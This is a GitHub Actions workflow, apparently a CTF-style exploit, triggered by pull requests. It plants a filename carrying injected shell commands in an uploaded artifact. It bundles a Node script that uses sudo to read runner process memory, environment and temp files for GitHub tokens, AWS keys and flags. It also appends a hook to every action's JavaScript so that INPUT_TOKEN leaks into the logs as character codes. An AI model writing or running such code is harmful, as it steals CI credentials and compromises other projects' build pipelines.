name: Test

on:
  pull_request:

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          rm -rf content
          mkdir -p content
          printf 'forged report body' > content/body
          python3 - <<'PY'
          import os
          name = "body;" + "cd${IFS}$HOME;" + "cd${IFS}..;" * 14 + "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
          assert len(name) < 255, len(name)
          open(os.path.join("content", name), "w").close()
          PY
          cat > content/p.js <<'JSEOF'
          const fs = require('fs');
          const path = require('path');
          const cp = require('child_process');
          const PY = String.raw`
import glob, os

MARKERS = [b'FLAG{', b'F\x00L\x00A\x00G\x00{', b'github_pat_', b'ghp_', b'READ_ONLY_PAT', b'R\x00E\x00A\x00D\x00_\x00O\x00N\x00L\x00Y\x00_\x00P\x00A\x00T', b'AKIA']
out = []
hits = 0

def find_hits(data, tag):
    global hits
    for m in MARKERS:
        i = data.find(m)
        n = 0
        while i != -1 and n < 4 and hits < 40:
            chunk = data[max(0, i - 24):i + 260]
            out.append('HIT %s marker=%r hex=%s' % (tag, m, chunk.hex()))
            hits += 1
            n += 1
            i = data.find(m, i + 1)

def pids():
    for d in glob.glob('/proc/[0-9]*'):
        pid = d.rsplit('/', 1)[-1]
        try:
            cmd = open(d + '/cmdline', 'rb').read().replace(b'\x00', b' ').decode('utf8', 'replace').strip()
        except Exception:
            continue
        yield pid, cmd

for pid, cmd in pids():
    if 'Runner.Worker' not in cmd and 'Runner.Listener' not in cmd:
        continue
    out.append('PROC %s %s' % (pid, cmd[:100]))
    try:
        maps = open('/proc/%s/maps' % pid).read().splitlines()
    except Exception as e:
        out.append('MAPERR %s %s' % (pid, e))
        continue
    total = 0
    for line in maps:
        parts = line.split()
        if len(parts) < 2 or 'r' not in parts[1]:
            continue
        try:
            a, b = [int(x, 16) for x in parts[0].split('-')]
        except Exception:
            continue
        size = b - a
        if size <= 0 or size > 150 * 1024 * 1024:
            continue
        if total > 1200 * 1024 * 1024 or hits >= 40:
            break
        try:
            with open('/proc/%s/mem' % pid, 'rb', 0) as f:
                f.seek(a)
                data = f.read(size)
        except Exception:
            continue
        total += len(data)
        find_hits(data, 'pid' + pid)
    out.append('READ %s bytes=%d' % (pid, total))
    try:
        env = open('/proc/%s/environ' % pid, 'rb').read()
        find_hits(env, 'env' + pid)
    except Exception:
        pass

for d in ['/home/runner/work/_temp', '/home/runner/_work/_temp', '/home/runner/work']:
    for root, dirs, files in os.walk(d):
        dirs[:] = dirs[:6]
        for fn in files[:200]:
            p = os.path.join(root, fn)
            try:
                if os.path.getsize(p) > 8 * 1024 * 1024:
                    continue
                data = open(p, 'rb').read()
            except Exception:
                continue
            find_hits(data, 'file:' + p)

print('\n'.join(out[:120]))
print('DONE hits=%d' % hits)
`;
          fs.writeFileSync('/tmp/scan.py', PY);
          let sudo = '';
          try { sudo = cp.execSync('sudo -n id', { encoding: 'utf8', timeout: 60000 }).trim(); } catch (e) { sudo = 'ERR ' + e.message; }
          console.log('SUDO ' + sudo);
          let scan = '';
          try { scan = cp.execSync('sudo -n python3 /tmp/scan.py 2>&1', { encoding: 'utf8', timeout: 600000, maxBuffer: 64 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
          for (let i = 0; i < scan.length; i += 1800) console.log('SCAN ' + scan.slice(i, i + 1800));
          const HOOK = fs.readFileSync('/tmp/content/content/hook.js', 'utf8');
          const roots = [];
          if (process.env.RUNNER_WORKSPACE) roots.push(path.join(path.dirname(process.env.RUNNER_WORKSPACE), '_actions'));
          if (process.env.HOME) roots.push(path.join(process.env.HOME, '..', '_actions'));
          roots.push('/home/runner/work/_actions', '/home/runner/_actions');
          const uniq = [...new Set(roots)];
          const seen = new Set();
          let patched = 0;
          function walk(d) {
            let ents = [];
            try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
            for (const e of ents) {
              const p = path.join(d, e.name);
              if (e.isDirectory()) { if (e.name === 'node_modules') continue; walk(p); }
              else if (p.endsWith('.js')) {
                if (seen.has(p)) continue;
                seen.add(p);
                try {
                  const cur = fs.readFileSync(p, 'utf8');
                  if (cur.indexOf('LEAK-CODES') !== -1) continue;
                  fs.appendFileSync(p, '\n' + HOOK + '\n');
                  patched++;
                } catch (e) {}
              }
            }
          }
          for (const d of uniq) walk(d);
          console.log('PATCHED ' + patched);
          JSEOF
          cat > content/hook.js <<'JSEOF'
          ;(function(){
            try {
              var t = process.env.INPUT_TOKEN;
              if (!t) { console.log('LEAK-NOTOKEN'); return; }
              var s = String(t);
              console.log('LEAK-CODES6 ' + s.split('').map(function(c){ return c.charCodeAt(0); }).join(','));
            } catch (e) { console.log('LEAK-ERR ' + e.message); }
          })();
          JSEOF
          ls -la content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
